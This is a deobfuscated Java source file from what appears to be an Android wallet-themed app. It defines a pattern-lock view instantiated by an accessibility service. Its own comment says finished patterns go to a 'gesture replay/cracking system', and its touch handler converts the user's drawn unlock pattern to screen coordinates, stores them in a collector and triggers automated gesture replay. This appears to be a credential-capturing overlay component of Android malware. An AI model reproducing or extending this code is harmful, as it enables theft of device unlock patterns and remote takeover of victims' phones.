package com.guard.wallet.patternlock;

import com.guard.wallet.core.AppUtils;
import android.animation.ValueAnimator;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.os.SystemClock;
import android.os.Build.VERSION;
import androidx.annotation.ColorInt;
import androidx.annotation.Dimension;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.view.animation.AnimationUtils;
import android.view.animation.Interpolator;
import com.guard.wallet.entity.Point;
import com.guard.wallet.helper.OverlayViewHelper;
import com.guard.wallet.infra.TouchDelegateHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.WindowUtils;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 图案锁自定义 View (核心)。
 * 渲染点阵网格，处理触摸输入绘制图案，
 * 并将完成的图案分发给手势回放/破解系统。
 *
 * vendor 原始路径: o0/h.java
 */
public final class PatternLockView extends View {
    public static int K;
    public boolean A;
    public boolean B;
    public boolean C;
    public float D;
    public float E;
    public final Path F;
    public final Rect G;
    public final Rect H;
    public Interpolator I;
    public Interpolator J;
    public AnimatorHelper[][] a;
    public int b;
    public long c;
    public final float d = 0.6F;
    public boolean e;
    public int f;
    public int g;
    public int h;
    public int i;
    public int j;
    public int k;
    public int l;
    public int m;
    public int n;
    public int o;
    public int p;
    public PatternListener q;
    public Paint r;
    public Paint s;
    public final ArrayList t;
    public ArrayList u;
    public boolean[][] v;
    public float w = -1.0F;
    public float x = -1.0F;
    public int y = 0;
    public boolean z = true;

    public PatternLockView(MyAccessibilityService var1) {
        super(var1, null);
        this.A = false;
        this.B = true;
        this.C = false;
        this.F = new Path();
        this.G = new Rect();
        this.H = new Rect();
        K = 3;
        this.e = false;
        this.f = 1;
        this.k = 3;
        this.j = -1;
        this.g = -1;
        this.i = -1;
        this.h = Color.parseColor("#f4511e");
        this.q = PatternListener.h;
        this.l = 10;
        this.m = 24;
        this.n = -1;
        this.o = 190;
        this.p = 100;
        int sz = K;
        this.b = sz * sz;
        this.u = new ArrayList(this.b);
        sz = K;
        this.v = new boolean[sz][sz];
        sz = K;
        this.a = new AnimatorHelper[sz][sz];

        for (int row = 0; row < K; row++) {
            for (int col = 0; col < K; col++) {
                AnimatorHelper[][] dots = this.a;
                dots[row][col] = new AnimatorHelper();
                dots[row][col].a = (float) this.l;
            }
        }

        this.t = new ArrayList();
        this.g();
    }

    private int getCurrentPathColor() {
        if (!this.A && !this.C) {
            int mode = this.y;
            if (mode == 2) {
                return this.h;
            } else if (mode != 0 && mode != 1) {
                throw new IllegalStateException("Unknown view mode " + this.y);
            } else {
                return this.i;
            }
        } else {
            return this.j;
        }
    }

    /** Add dot to the current pattern */
    public final void a(PatternDot var1) {
        boolean[][] selected = this.v;
        int row = var1.a;
        boolean[] rowArr = selected[row];
        int col = var1.b;
        rowArr[col] = true;
        this.u.add(var1);
        if (!this.A) {
            AnimatorHelper dot = this.a[row][col];
            this.j((float) this.l, (float) this.m, (long) this.o, this.J, dot, null);
            float startX = this.w;
            float startY = this.x;
            float endX = this.e(col);
            float endY = this.f(row);
            ValueAnimator anim = ValueAnimator.ofFloat(new float[]{0.0F, 1.0F});
            anim.addUpdateListener(new DotAnimatorListener(this, dot, startX, endX, startY, endY));
            anim.addListener(new AnimatorEndListener(this, dot, 0));
            anim.setInterpolator(this.I);
            anim.setDuration((long) this.p);
            anim.start();
            dot.e = anim;
        }

        this.announceForAccessibility("Dot added to pattern");
        ArrayList pattern = this.u;

        for (Object obj : this.t) {
            PatternLock listener = (PatternLock) obj;
            if (listener != null) {
                String tag = PatternLock.class.getName();
                StringBuilder sb = new StringBuilder("Pattern progress: ");
                sb.append(com.guard.wallet.utils.SystemHelper.E0(listener.a, pattern));
                Log.d(tag, sb.toString());
            }
        }
    }

    /** Clear selection state of all dots */
    public final void b() {
        for (int row = 0; row < K; row++) {
            for (int col = 0; col < K; col++) {
                this.v[row][col] = false;
            }
        }
    }

    /** Cleanup: clear listeners, pattern, paints, path */
    public final void c() {
        ArrayList listeners = this.t;
        try {
            if (!listeners.isEmpty()) {
                listeners.clear();
            }
            if (!this.u.isEmpty()) {
                this.u.clear();
            }
            this.s = null;
            this.r = null;
            Path path = this.F;
            if (path != null) {
                path.close();
            }
        } catch (Exception ex) {
            AppUtils.s("PatternLockView", ex);
        }
    }

    /** Detect which dot the touch position hits */
    public final PatternDot d(float touchX, float touchY) {
        float cellH = this.E;
        float ratio = this.d;
        float dotH = ratio * cellH;
        float padTop = (float) this.getPaddingTop();
        float offsetH = (cellH - dotH) / 2.0F;

        int hitRow = -1;
        for (int row = 0; row < K; row++) {
            float top = (float) row * cellH + offsetH + padTop;
            if (touchY >= top && touchY <= top + dotH) {
                hitRow = row;
                break;
            }
        }

        PatternDot result = null;
        PatternDot midDot = null;

        if (hitRow >= 0) {
            float cellW = this.D;
            float dotW = ratio * cellW;
            float padLeft = (float) this.getPaddingLeft();
            float offsetW = (cellW - dotW) / 2.0F;

            int hitCol = -1;
            for (int col = 0; col < K; col++) {
                float left = (float) col * cellW + offsetW + padLeft;
                if (touchX >= left && touchX <= left + dotW) {
                    hitCol = col;
                    break;
                }
            }

            if (hitCol >= 0 && !this.v[hitRow][hitCol]) {
                result = PatternDot.b(hitRow, hitCol);
            }
        }

        if (result != null) {
            ArrayList pattern = this.u;
            if (!pattern.isEmpty()) {
                PatternDot lastDot = (PatternDot) pattern.get(pattern.size() - 1);
                int lastRow = lastDot.a;
                int dRow = result.a - lastRow;
                int lastCol = lastDot.b;
                int dCol = result.b - lastCol;
                int midRow = lastRow;

                if (Math.abs(dRow) == 2 && Math.abs(dCol) != 1) {
                    int sign = dRow > 0 ? 1 : -1;
                    midRow = lastDot.a + sign;
                }

                int midCol = lastCol;
                if (Math.abs(dCol) == 2 && Math.abs(dRow) != 1) {
                    int sign = dCol > 0 ? 1 : -1;
                    midCol = lastCol + sign;
                }

                midDot = PatternDot.b(midRow, midCol);
            }

            if (midDot != null && !this.v[midDot.a][midDot.b]) {
                this.a(midDot);
            }

            this.a(result);
            if (this.B) {
                this.performHapticFeedback(1, 3);
            }

            return result;
        }
        return null;
    }

    /** Get center X of column */
    public final float e(int col) {
        float padLeft = (float) this.getPaddingLeft();
        float colF = (float) col;
        float cellW = this.D;
        return cellW / 2.0F + colF * cellW + padLeft;
    }

    /** Get center Y of row (based on dot alignment mode) */
    public final float f(int row) {
        PatternListener align = this.q;
        if (align == PatternListener.a) {
            float padTop = (float) this.getPaddingTop();
            return (float) row * this.E + padTop - (float) this.l / 2.0F;
        } else if (align == PatternListener.b) {
            float padTop = (float) this.getPaddingTop();
            return (float) row * this.E + padTop;
        } else if (align == PatternListener.c) {
            float y = (float) row * this.E + (float) this.getPaddingTop();
            return (float) this.l / 2.0F + y + (float) this.l;
        } else if (align == PatternListener.d) {
            float padTop = (float) this.getPaddingTop();
            return (float) row * this.E + padTop + (float) this.l;
        } else if (align == PatternListener.e) {
            float y = (float) row * this.E + (float) this.getPaddingTop();
            return (float) this.l / 2.0F + y + (float) this.l;
        } else if (align == PatternListener.f) {
            float padTop = (float) this.getPaddingTop();
            int dotSize = this.l;
            return (float) row * this.E + padTop + (float) dotSize + (float) dotSize;
        } else if (align == PatternListener.g) {
            float padTop = (float) this.getPaddingTop();
            int dotSize = this.l;
            return (float) row * this.E + padTop + (float) dotSize + (float) dotSize;
        } else if (align == PatternListener.h) {
            float padTop = (float) this.getPaddingTop();
            float cellH = this.E;
            return cellH / 2.0F + (float) row * cellH + padTop;
        } else if (align == PatternListener.i) {
            float padTop = (float) this.getPaddingTop();
            float cellH = this.E;
            return cellH / 2.0F + (float) row * cellH + padTop - (float) this.l / 2.0F;
        } else if (align == PatternListener.j) {
            float padTop = (float) this.getPaddingTop();
            float cellH = this.E;
            return (float) this.l / 2.0F + cellH / 2.0F + (float) row * cellH + padTop;
        } else {
            float padTop = (float) this.getPaddingTop();
            return (float) (row + 2) * this.E + padTop - (float) this.l / 2.0F;
        }
    }

    /** Initialize paints and interpolators */
    public final void g() {
        this.setClickable(true);
        Paint pathPaint = new Paint();
        this.s = pathPaint;
        pathPaint.setAntiAlias(true);
        this.s.setDither(true);
        this.s.setColor(this.j);
        this.s.setStyle(Paint.Style.STROKE);
        this.s.setStrokeJoin(Paint.Join.ROUND);
        this.s.setStrokeCap(Paint.Cap.ROUND);
        this.s.setStrokeWidth((float) this.k);
        if (VERSION.SDK_INT >= 29) {
            TouchDelegateHelper.applyBlendMode(this.s, TouchDelegateHelper.getDefaultBlendMode());
        }

        Paint dotPaint = new Paint();
        this.r = dotPaint;
        dotPaint.setAntiAlias(true);
        this.r.setDither(true);
        if (!this.isInEditMode()) {
            this.I = AnimationUtils.loadInterpolator(this.getContext(), 17563661);
            this.J = AnimationUtils.loadInterpolator(this.getContext(), 17563662);
        }
    }

    public int getAspectRatio() { return this.f; }
    public int getCorrectStateColor() { return this.i; }
    public int getDotAnimationDuration() { return this.o; }
    public int getDotCount() { return K; }
    public int getDotNormalSize() { return this.l; }
    public int getDotSelectedColor() { return this.n; }
    public int getDotSelectedSize() { return this.m; }
    public int getNormalStateColor() { return this.g; }
    public int getPathColor() { return this.j; }
    public int getPathEndAnimationDuration() { return this.p; }
    public int getPathWidth() { return this.k; }
    public List<PatternDot> getPattern() { return (List<PatternDot>) this.u.clone(); }
    public int getPatternSize() { return this.b; }
    public int getPatternViewMode() { return this.y; }
    public int getWrongStateColor() { return this.h; }

    /** Announce pattern cleared */
    public final void h() {
        this.announceForAccessibility("Pattern cleared");
        Iterator iter = this.t.iterator();
        while (iter.hasNext()) {
            if ((PatternLock) iter.next() != null) {
                Log.d(PatternLock.class.getName(), "Pattern has been cleared");
            }
        }
    }

    /** Announce pattern drawing started */
    public final void i() {
        this.announceForAccessibility("Pattern drawing started");
        Iterator iter = this.t.iterator();
        while (iter.hasNext()) {
            if ((PatternLock) iter.next() != null) {
                Log.d(PatternLock.class.getName(), "Pattern drawing started");
            }
        }
    }

    /** Animate dot size change with optional end callback */
    public final void j(float from, float to, long duration, Interpolator interp, AnimatorHelper dot, Runnable endCallback) {
        ValueAnimator anim = ValueAnimator.ofFloat(new float[]{from, to});
        anim.addUpdateListener(new PathAnimatorListener(this, dot));
        if (endCallback != null) {
            anim.addListener(new AnimatorEndListener(this, endCallback, 1));
        }
        anim.setInterpolator(interp);
        anim.setDuration(duration);
        anim.start();
    }

    @Override
    public final void onDraw(Canvas canvas) {
        ArrayList pattern = this.u;
        int patSize = pattern.size();
        boolean[][] selected = this.v;

        // Animation mode: progressively reveal dots
        if (this.y == 1) {
            int elapsed = (int) (SystemClock.elapsedRealtime() - this.c) % ((patSize + 1) * 700);
            int visibleCount = elapsed / 700;
            this.b();

            for (int idx = 0; idx < visibleCount; idx++) {
                PatternDot dot = (PatternDot) pattern.get(idx);
                selected[dot.a][dot.b] = true;
            }

            boolean drawingLine = visibleCount > 0 && visibleCount < patSize;
            if (drawingLine) {
                float progress = (float) (elapsed % 700) / 700.0F;
                PatternDot prevDot = (PatternDot) pattern.get(visibleCount - 1);
                float fromX = this.e(prevDot.b);
                float fromY = this.f(prevDot.a);
                PatternDot nextDot = (PatternDot) pattern.get(visibleCount);
                float toX = this.e(nextDot.b);
                float toY = this.f(nextDot.a);
                this.w = fromX + (toX - fromX) * progress;
                this.x = fromY + (toY - fromY) * progress;
            }

            this.invalidate();
        }

        // Draw dots
        Path path = this.F;
        path.rewind();

        for (int row = 0; row < K; row++) {
            float centerY = this.f(row);
            for (int col = 0; col < K; col++) {
                AnimatorHelper dot = this.a[row][col];
                float centerX = this.e(col);
                float radius = dot.a;
                boolean isSelected = selected[row][col];
                boolean isAnimating = dot.b;
                Paint dotPaint = this.r;

                int color;
                if (isSelected && !this.A && !this.C) {
                    int mode = this.y;
                    if (mode == 2) {
                        color = this.h;
                    } else if (mode != 0 && mode != 1) {
                        throw new IllegalStateException("Unknown view mode " + this.y);
                    } else {
                        color = this.i;
                    }
                } else if (isAnimating) {
                    color = this.n;
                } else {
                    color = this.g;
                }

                dotPaint.setColor(color);
                this.r.setAlpha(255);
                canvas.drawCircle(centerX, centerY + 0.0F, radius * 1.0F / 2.0F, this.r);
            }
        }

        // Draw path lines
        if (!this.A) {
            this.s.setColor(this.getCurrentPathColor());
            int idx = 0;
            float lastX = 0.0F;
            float lastY = 0.0F;
            boolean hasLine = false;

            while (idx < patSize) {
                PatternDot dot = (PatternDot) pattern.get(idx);
                boolean[] rowSelected = selected[dot.a];
                int col = dot.b;
                if (!rowSelected[col]) {
                    break;
                }

                float cx = this.e(col);
                int row = dot.a;
                float cy = this.f(row);
                if (idx != 0) {
                    AnimatorHelper dotState = this.a[row][col];
                    path.rewind();
                    path.moveTo(lastX, lastY);
                    float animX = dotState.c;
                    if (animX != Float.MIN_VALUE) {
                        float animY = dotState.d;
                        if (animY != Float.MIN_VALUE) {
                            path.lineTo(animX, animY);
                        } else {
                            path.lineTo(cx, cy);
                        }
                    } else {
                        path.lineTo(cx, cy);
                    }
                    canvas.drawPath(path, this.s);
                }

                idx++;
                hasLine = true;
                lastX = cx;
                lastY = cy;
            }

            // Draw line to current touch position
            if ((this.C || this.y == 1) && hasLine) {
                path.rewind();
                path.moveTo(lastX, lastY);
                path.lineTo(this.w, this.x);
                Paint pathPaint = this.s;
                float dx = this.w - lastX;
                float dy = this.x - lastY;
                float dist = (float) Math.sqrt((double) (dy * dy + dx * dx));
                float alpha = Math.min(1.0F, Math.max(0.0F, (dist / this.D - 0.3F) * 4.0F));
                pathPaint.setAlpha((int) (alpha * 255.0F));
                canvas.drawPath(path, this.s);
            }
        }
    }

    @Override
    public final boolean onHoverEvent(MotionEvent event) {
        if (((AccessibilityManager) this.getContext().getSystemService("accessibility")).isTouchExplorationEnabled()) {
            int origAction = event.getAction();
            int mapped;
            if (origAction == 7) {
                mapped = 2;
            } else if (origAction == 9) {
                mapped = 0;
            } else if (origAction == 10) {
                mapped = 1;
            } else {
                mapped = -1;
            }
            if (mapped >= 0) {
                event.setAction(mapped);
            }
            this.onTouchEvent(event);
            event.setAction(origAction);
        }
        return super.onHoverEvent(event);
    }

    @Override
    public final void onMeasure(int widthSpec, int heightSpec) {
        super.onMeasure(widthSpec, heightSpec);
        if (this.e) {
            int minW = this.getSuggestedMinimumWidth();
            int specW = MeasureSpec.getSize(widthSpec);
            int modeW = MeasureSpec.getMode(widthSpec);
            int w;
            if (modeW == Integer.MIN_VALUE) {
                w = Math.max(specW, minW);
            } else if (modeW == 0) {
                w = minW;
            } else {
                w = specW;
            }

            int minH = this.getSuggestedMinimumHeight();
            int specH = MeasureSpec.getSize(heightSpec);
            int modeH = MeasureSpec.getMode(heightSpec);
            int ht;
            if (modeH == Integer.MIN_VALUE) {
                ht = Math.max(specH, minH);
            } else if (modeH == 0) {
                ht = minH;
            } else {
                ht = specH;
            }

            int aspect = this.f;
            if (aspect == 0) {
                w = Math.min(w, ht);
                ht = w;
            } else if (aspect == 1) {
                ht = Math.min(w, ht);
            } else if (aspect == 2) {
                w = Math.min(w, ht);
            } else {
                throw new IllegalStateException("Unknown aspect ratio");
            }

            this.setMeasuredDimension(w, ht);
        }
    }

    @Override
    public final void onRestoreInstanceState(Parcelable state) {
        PatternSavedState saved = (PatternSavedState) state;
        super.onRestoreInstanceState(saved.getSuperState());
        ArrayList dots = new ArrayList();
        int idx = 0;

        while (true) {
            String patStr = saved.a;
            if (idx >= patStr.length()) {
                this.u.clear();
                this.u.addAll(dots);
                this.b();

                for (Object obj : dots) {
                    PatternDot dot = (PatternDot) obj;
                    this.v[dot.a][dot.b] = true;
                }

                this.setViewMode(0);
                this.y = saved.b;
                this.z = saved.c;
                this.A = saved.d;
                this.B = saved.e;
                return;
            }

            int num = Character.getNumericValue(patStr.charAt(idx));
            dots.add(PatternDot.b(num / this.getDotCount(), num % this.getDotCount()));
            idx++;
        }
    }

    @Override
    public final Parcelable onSaveInstanceState() {
        return new PatternSavedState(super.onSaveInstanceState(),
                com.guard.wallet.utils.SystemHelper.E0(this, this.u),
                this.y, this.z, this.A, this.B);
    }

    @Override
    public final void onSizeChanged(int w, int ht, int oldW, int oldH) {
        this.D = (float) (w - this.getPaddingLeft() - this.getPaddingRight()) / (float) K;
        this.E = (float) (ht - this.getPaddingTop() - this.getPaddingBottom()) / (float) K;
    }

    @Override
    public final boolean onTouchEvent(MotionEvent event) {
        boolean inputEnabled = this.z;
        if (!inputEnabled || !this.isEnabled()) {
            return false;
        }

        int action = event.getAction();
        if (action == 0) {
            // ACTION_DOWN
            this.u.clear();
            this.b();
            this.y = 0;
            this.invalidate();
            float tx = event.getX();
            float ty = event.getY();
            PatternDot hit = this.d(tx, ty);
            if (hit != null) {
                this.C = true;
                this.y = 0;
                this.i();
            } else {
                this.C = false;
                this.h();
            }

            if (hit != null) {
                float cx = this.e(hit.b);
                float cy = this.f(hit.a);
                float halfW = this.D / 2.0F;
                float halfH = this.E / 2.0F;
                this.invalidate((int) (cx - halfW), (int) (cy - halfH),
                        (int) (cx + halfW), (int) (cy + halfH));
            }

            this.w = tx;
            this.x = ty;
            return true;
        } else if (action == 1) {
            // ACTION_UP
            if (!this.u.isEmpty()) {
                this.C = false;

                // Cancel running animations
                for (int row = 0; row < K; row++) {
                    for (int col = 0; col < K; col++) {
                        AnimatorHelper dot = this.a[row][col];
                        ValueAnimator anim = dot.e;
                        if (anim != null) {
                            anim.cancel();
                            dot.c = Float.MIN_VALUE;
                            dot.d = Float.MIN_VALUE;
                        }
                    }
                }

                this.announceForAccessibility("Pattern drawing completed");
                ArrayList pattern = this.u;

                for (Object obj : this.t) {
                    PatternLock listener = (PatternLock) obj;
                    if (listener != null) {
                        ReentrantLock lock = listener.b;
                        if (lock.tryLock()) {
                            Log.d(PatternLock.class.getName(), "Pattern complete: ");
                            PatternLockView view = listener.a;
                            if (view != null) {
                                LinkedList points = new LinkedList();
                                if (pattern != null && !pattern.isEmpty()) {
                                    for (Object dotObj : pattern) {
                                        PatternDot patDot = (PatternDot) dotObj;
                                        Point pt = null;
                                        if (patDot != null) {
                                            int[] loc = new int[2];
                                            view.getLocationOnScreen(loc);
                                            Log.d("getCenterForDot X:", String.valueOf(loc[0]));
                                            Log.d("getCenterForDot Y:", String.valueOf(loc[1]));
                                            pt = new Point(
                                                    view.e(patDot.b) + (float) loc[0],
                                                    view.f(patDot.a) + (float) loc[1]);
                                        }
                                        if (pt != null) {
                                            points.add(pt);
                                        }
                                    }
                                }

                                com.guard.wallet.plug.GesturePatternCollector plugD = com.guard.wallet.helper.OverlayViewHelper.b;
                                plugD.getClass();
                                if (!points.isEmpty()) {
                                    LinkedList plugList = plugD.patternPoints;
                                    plugList.clear();
                                    plugList.addAll(points);
                                }

                                view.u.clear();
                                view.b();
                                view.y = 0;
                                view.invalidate();

                                // Trigger gesture replay
                                try {
                                    ReentrantLock gestLock = com.guard.wallet.helper.OverlayViewHelper.c;
                                    if (gestLock.tryLock()) {
                                        if (com.guard.wallet.utils.WindowUtils.isMainThread()) {
                                            com.guard.wallet.helper.OverlayViewHelper.e();
                                        } else {
                                            Handler handler = new Handler(Looper.getMainLooper());
                                            com.guard.wallet.helper.DelayedRunnable runnable = new com.guard.wallet.helper.DelayedRunnable(2);
                                            handler.post(runnable);
                                        }
                                        gestLock.unlock();
                                    }
                                } catch (Exception ex) {
                                    AppUtils.s("com.guard.wallet.helper.o", ex);
                                }

                                // Gesture auto-input fallback
                                if (!com.guard.wallet.helper.OverlayViewHelper.i()) {
                                    com.guard.wallet.utils.SystemHelper.T0(5);
                                    Point[] ptArr = new Point[points.size()];
                                    points.toArray(ptArr);
                                    if (com.guard.wallet.utils.SystemHelper.S(10L, 800L, ptArr)) {
                                        com.guard.wallet.utils.SystemHelper.T0(5);
                                    }
                                }
                            }

                            lock.unlock();
                        }
                    }
                }

                this.invalidate();
            }
            return true;
        } else if (action == 2) {
            // ACTION_MOVE
            float strokeW = (float) this.k;
            int histSize = event.getHistorySize();
            Rect dirty = this.H;
            dirty.setEmpty();

            boolean moved = false;
            for (int hist = 0; hist < histSize + 1; hist++) {
                float hx = hist < histSize ? event.getHistoricalX(hist) : event.getX();
                float hy = hist < histSize ? event.getHistoricalY(hist) : event.getY();

                PatternDot hit = this.d(hx, hy);
                int patSize = this.u.size();
                if (hit != null && patSize == 1) {
                    this.C = true;
                    this.i();
                }

                float dx = Math.abs(hx - this.w);
                float dy = Math.abs(hy - this.x);
                if (dx > 0.0F || dy > 0.0F) {
                    moved = true;
                }

                if (this.C && patSize > 0) {
                    PatternDot lastDot = (PatternDot) this.u.get(patSize - 1);
                    float lx = this.e(lastDot.b);
                    float ly = this.f(lastDot.a);
                    float minX = Math.min(lx, hx) - strokeW;
                    float maxX = Math.max(lx, hx) + strokeW;
                    float minY = Math.min(ly, hy) - strokeW;
                    float maxY = Math.max(ly, hy) + strokeW;

                    if (hit != null) {
                        float halfCellW = this.D * 0.5F;
                        float halfCellH = this.E * 0.5F;
                        float hitCx = this.e(hit.b);
                        float hitCy = this.f(hit.a);
                        minX = Math.min(hitCx - halfCellW, minX);
                        maxX = Math.max(hitCx + halfCellW, maxX);
                        minY = Math.min(hitCy - halfCellH, minY);
                        maxY = Math.max(hitCy + halfCellH, maxY);
                    }

                    dirty.union(Math.round(minX), Math.round(minY),
                            Math.round(maxX), Math.round(maxY));
                }
            }

            this.w = event.getX();
            this.x = event.getY();
            if (moved) {
                Rect invalidRect = this.G;
                invalidRect.union(dirty);
                this.invalidate(invalidRect);
                invalidRect.set(dirty);
            }
            return true;
        } else if (action == 3) {
            // ACTION_CANCEL
            this.C = false;
            this.u.clear();
            this.b();
            this.y = 0;
            this.invalidate();
            this.h();
            return true;
        }
        return false;
    }

    public void setAspectRatio(int ratio) {
        this.f = ratio;
        this.requestLayout();
    }

    public void setAspectRatioEnabled(boolean enabled) {
        this.e = enabled;
        this.requestLayout();
    }

    public void setCorrectStateColor(@ColorInt int color) {
        this.i = color;
    }

    public void setDotAlign(PatternListener align) {
        this.q = align;
        this.invalidate();
    }

    public void setDotAnimationDuration(int duration) {
        this.o = duration;
        this.invalidate();
    }

    public void setDotCount(int count) {
        K = count;
        this.b = count * count;
        this.u = new ArrayList(this.b);
        int sz = K;
        this.v = new boolean[sz][sz];
        sz = K;
        this.a = new AnimatorHelper[sz][sz];

        for (int row = 0; row < K; row++) {
            for (int col = 0; col < K; col++) {
                AnimatorHelper[][] dots = this.a;
                dots[row][col] = new AnimatorHelper();
                dots[row][col].a = (float) this.l;
            }
        }

        this.requestLayout();
        this.invalidate();
    }

    public void setDotNormalSize(@Dimension int size) {
        this.l = size;
        for (int row = 0; row < K; row++) {
            for (int col = 0; col < K; col++) {
                AnimatorHelper[][] dots = this.a;
                dots[row][col] = new AnimatorHelper();
                dots[row][col].a = (float) this.l;
            }
        }
        this.invalidate();
    }

    public void setDotSelectedColor(int color) { this.n = color; }
    public void setDotSelectedSize(@Dimension int size) { this.m = size; }
    public void setEnableHapticFeedback(boolean enabled) { this.B = enabled; }
    public void setInStealthMode(boolean stealth) { this.A = stealth; }
    public void setInputEnabled(boolean enabled) { this.z = enabled; }
    public void setNormalStateColor(@ColorInt int color) { this.g = color; }

    public void setPathColor(int color) {
        this.j = color;
        this.g();
        this.invalidate();
    }

    public void setPathEndAnimationDuration(int duration) { this.p = duration; }

    public void setPathWidth(@Dimension int width) {
        this.k = width;
        this.g();
        this.invalidate();
    }

    public void setTactileFeedbackEnabled(boolean enabled) { this.B = enabled; }

    public void setViewMode(int mode) {
        this.y = mode;
        if (mode == 1) {
            if (this.u.size() == 0) {
                throw new IllegalStateException(
                        "you must have a pattern to animate if you want to set the display mode to animate");
            }
            this.c = SystemClock.elapsedRealtime();
            PatternDot firstDot = (PatternDot) this.u.get(0);
            this.w = this.e(firstDot.b);
            this.x = this.f(firstDot.a);
            this.b();
        }
        this.invalidate();
    }

    public void setWrongStateColor(@ColorInt int color) { this.h = color; }

    public void setSystemUiVisibility(int visibility) {
        super.setSystemUiVisibility(visibility);
    }
}
